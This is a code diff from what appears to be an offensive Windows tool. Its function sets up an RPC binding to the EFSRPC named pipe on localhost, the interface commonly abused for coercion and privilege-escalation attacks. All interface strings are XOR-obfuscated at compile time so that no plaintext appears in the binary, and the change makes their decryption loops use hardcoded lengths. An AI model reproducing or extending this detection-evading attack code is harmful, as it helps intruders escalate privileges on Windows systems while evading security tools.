@@ -30,9 +30,8 @@ static handle_t couch_bind(void) {
             (unsigned char)__TIME__[3] ^
             (unsigned char)__TIME__[6]) | 1);
 
-#define _W(buf) wdeobf((unsigned char*)(buf), sizeof(buf))
-
-    // L"df1941c5-fe89-4e79-bf10-463657acf44d" — XOR'd at compile time
+    // all wide strings XOR'd at compile time — no plaintext in .rdata
+    // hardcoded length loops — null check fails when XOR'd zero is non-zero
     unsigned short _uuid[] = {
         L'd' ^ _k,L'f' ^ _k,L'1' ^ _k,L'9' ^ _k,L'4' ^ _k,L'1' ^ _k,L'c' ^ _k,L'5' ^ _k,
         L'-' ^ _k,L'f' ^ _k,L'e' ^ _k,L'8' ^ _k,L'9' ^ _k,L'-' ^ _k,L'4' ^ _k,L'e' ^ _k,
@@ -40,17 +39,29 @@ static handle_t couch_bind(void) {
         L'4' ^ _k,L'6' ^ _k,L'3' ^ _k,L'6' ^ _k,L'5' ^ _k,L'7' ^ _k,L'a' ^ _k,L'c' ^ _k,
         L'f' ^ _k,L'4' ^ _k,L'4' ^ _k,L'd' ^ _k, 0
     };
-    unsigned short _proto[] = { L'n' ^ _k,L'c' ^ _k,L'a' ^ _k,L'c' ^ _k,L'n' ^ _k,L'_' ^ _k,L'n' ^ _k,L'p' ^ _k, 0 };
-    unsigned short _host2[] = { L'\\' ^ _k,L'\\' ^ _k,L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0 };
-    unsigned short _pipe[] = { L'\\' ^ _k,L'p' ^ _k,L'i' ^ _k,L'p' ^ _k,L'e' ^ _k,L'\\' ^ _k,L'e' ^ _k,L'f' ^ _k,L's' ^ _k,L'r' ^ _k,L'p' ^ _k,L'c' ^ _k, 0 };
-    unsigned short _host[] = { L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0 };
+    unsigned short _proto[] = {
+        L'n' ^ _k,L'c' ^ _k,L'a' ^ _k,L'c' ^ _k,
+        L'n' ^ _k,L'_' ^ _k,L'n' ^ _k,L'p' ^ _k, 0
+    };
+    unsigned short _host2[] = {
+        L'\\' ^ _k,L'\\' ^ _k,L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,
+        L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
+    };
+    unsigned short _pipe[] = {
+        L'\\' ^ _k,L'p' ^ _k,L'i' ^ _k,L'p' ^ _k,L'e' ^ _k,L'\\' ^ _k,
+        L'e' ^ _k,L'f' ^ _k,L's' ^ _k,L'r' ^ _k,L'p' ^ _k,L'c' ^ _k, 0
+    };
+    unsigned short _host[] = {
+        L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,
+        L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
+    };
 
-    // decrypt in place
-    for (int i = 0; _uuid[i]; i++) _uuid[i] ^= _k;
-    for (int i = 0; _proto[i]; i++) _proto[i] ^= _k;
-    for (int i = 0; _host2[i]; i++) _host2[i] ^= _k;
-    for (int i = 0; _pipe[i]; i++) _pipe[i] ^= _k;
-    for (int i = 0; _host[i]; i++) _host[i] ^= _k;
+    // decrypt using hardcoded lengths — no null-terminator dependency
+    for (int i = 0; i < 36; i++) _uuid[i] ^= _k;
+    for (int i = 0; i < 8; i++) _proto[i] ^= _k;
+    for (int i = 0; i < 11; i++) _host2[i] ^= _k;
+    for (int i = 0; i < 12; i++) _pipe[i] ^= _k;
+    for (int i = 0; i < 9; i++) _host[i] ^= _k;
 
     st = RpcStringBindingComposeW(
         (RPC_WSTR)_uuid,
